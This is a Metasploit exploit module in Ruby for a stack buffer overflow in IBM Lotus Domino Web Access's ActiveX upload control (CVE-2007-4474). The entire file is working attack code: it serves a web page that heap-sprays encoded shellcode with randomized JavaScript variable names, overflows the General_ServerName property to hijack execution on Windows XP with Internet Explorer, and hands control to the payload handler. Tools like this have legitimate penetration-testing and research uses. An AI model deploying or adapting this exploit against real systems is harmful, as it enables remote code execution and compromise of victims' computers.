##
# $Id: ibmlotusdomino_dwa_uploadmodule.rb 10394 2010-09-20 08:06:27Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::HttpServer::HTML

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'IBM Lotus Domino Web Access Upload Module Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack buffer overflow in IBM Lotus Domino Web Access Upload Module.
				By sending an overly long string to the "General_ServerName()" property located
				in the dwa7w.dll and the inotes6w.dll control, an attacker may be able to execute
				arbitrary code.
			},
			'License'        => MSF_LICENSE,
			'Author'         => [ 'Elazar Broad <elazarb[at]earthlink.net>' ],
			'Version'        => '$Revision: 10394 $',
			'References'     =>
				[
					[ 'CVE', '2007-4474' ],
					[ 'OSVDB', '40954' ],
					[ 'BID', '26972' ],
					[ 'URL', 'http://milw0rm.com/exploits/4820' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space'         => 800,
					'BadChars'      => "\x00\x09\x0a\x0d'\\",
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Windows XP SP0-SP2 / IE 6.0 SP0-2 & IE 7.0 English', { 'Ret' => 0x0C0C0C0C } ]
				],
			'DisclosureDate' => 'Dec 20 2007',
			'DefaultTarget'  => 0))
	end

	def autofilter
		false
	end

	def check_dependencies
		use_zlib
	end

	def on_request_uri(cli, request)
		# Re-generate the payload
		return if ((p = regenerate_payload(cli)) == nil)

		# Encode the shellcode
		shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))

		# Setup exploit buffers
		nops 	  = Rex::Text.to_unescape(make_nops(4))
		junk	  = Rex::Text.to_unescape(rand_text_alpha(2))
		ret  	  = Rex::Text.to_unescape([target.ret].pack('V'))
		blocksize = 0x30000
		fillto    = 400

		# Randomize the javascript variable names
		dwa7w        = rand_text_alpha(rand(100) + 1)
		inotes6      = rand_text_alpha(rand(100) + 1)
		j_shellcode  = rand_text_alpha(rand(100) + 1)
		j_nops       = rand_text_alpha(rand(100) + 1)
		j_headersize = rand_text_alpha(rand(100) + 1)
		j_slackspace = rand_text_alpha(rand(100) + 1)
		j_fillblock  = rand_text_alpha(rand(100) + 1)
		j_block      = rand_text_alpha(rand(100) + 1)
		j_memory     = rand_text_alpha(rand(100) + 1)
		j_counter    = rand_text_alpha(rand(30) + 2)
		j_ret        = rand_text_alpha(rand(100) + 1)
		j_junk       = rand_text_alpha(rand(100) + 1)


		# Build out the message
		content = <<-EOF
<html>
<object classid='clsid:E008A543-CEFB-4559-912F-C27C2B89F13B' id='#{dwa7w}'></object>
<object classid='clsid:3BFFE033-BF43-11D5-A271-00A024A51325' id='#{inotes6}'></object>
<script language='javascript'>
#{j_shellcode} = unescape('#{shellcode}');
#{j_nops} = unescape('#{nops}');
#{j_headersize} = 20;
#{j_slackspace} = #{j_headersize} + #{j_shellcode}.length
while (#{j_nops}.length < #{j_slackspace}) #{j_nops} += #{j_nops};
#{j_fillblock} = #{j_nops}.substring(0, #{j_slackspace});
#{j_block} = #{j_nops}.substring(0, #{j_nops}.length - #{j_slackspace});
while(#{j_block}.length + #{j_slackspace} < #{blocksize}) #{j_block} = #{j_block} + #{j_block} + #{j_fillblock};
#{j_memory} = new Array();
for (#{j_counter} = 0; #{j_counter} < #{fillto}; #{j_counter}++) #{j_memory}[#{j_counter}] = #{j_block} + #{j_shellcode};
#{j_ret} = unescape('#{ret}');
while (#{j_ret}.length < 450) #{j_ret} += #{j_ret};
#{j_junk} = unescape('#{junk}');
while (#{j_junk}.length < 2000) #{j_junk} += #{j_junk};
try {
	#{dwa7w}.General_ServerName = #{j_junk} + #{j_ret};
	#{dwa7w}.InstallBrowserHelperDll();
} catch(err) {}
try {
	#{inotes6}.General_ServerName = #{j_junk} + #{j_ret};
	#{inotes6}.InstallBrowserHelperDll();
} catch(err) {}
</script>
</html>
EOF

		print_status("Sending exploit to #{cli.peerhost}:#{cli.peerport}...")

		# Transmit the response to the client
		send_response_html(cli, content)

		# Handle the payload
		handler(cli)
	end

end
